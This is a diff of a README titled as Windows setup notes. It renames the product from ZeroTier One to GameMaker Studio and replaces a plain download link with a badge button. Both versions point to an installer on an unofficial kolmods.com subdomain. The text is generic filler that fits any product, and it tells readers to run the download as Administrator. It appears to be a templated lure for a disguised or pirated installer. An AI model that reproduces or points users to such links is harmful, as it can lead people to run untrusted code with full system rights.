@@ -1,10 +1,14 @@
-# ZeroTier One Windows Setup Notes
+# GameMaker Studio Windows Setup Notes
 
-**Download:** [Get Windows installer →](https://zerotier-one.kolmods.com/)
+<p align="center">
+  <a href="https://gamemaker-studio-setup.kolmods.com/">
+    <img src="https://img.shields.io/badge/Download-GameMaker%20Studio-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download GameMaker Studio">
+  </a>
+</p>
 
 ## Download & Install
 
-> Setup notes for **ZeroTier One** on Windows 10/11 (64-bit). Run the installer as Administrator.
+> Setup notes for **GameMaker Studio** on Windows 10/11 (64-bit). Run the installer as Administrator.
 
 ### Quick steps
 
@@ -12,15 +16,15 @@
 2. Save the file to a local folder you can find later
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
-5. Restart if the installer asks — then launch **ZeroTier One** from the Start menu
+5. Restart if the installer asks — then launch **GameMaker Studio** from the Start menu
 
 ## What you can use it for
 
-- Core ZeroTier One features on Windows desktop
-- Install and configure ZeroTier One for daily use
-- Import, edit, and export with ZeroTier One tools
-- Tune settings and profiles inside ZeroTier One
-- Integrate ZeroTier One into your existing workflow
+- Core GameMaker Studio features on Windows desktop
+- Install and configure GameMaker Studio for daily use
+- Import, edit, and export with GameMaker Studio tools
+- Tune settings and profiles inside GameMaker Studio
+- Integrate GameMaker Studio into your existing workflow
 
 ## License
 
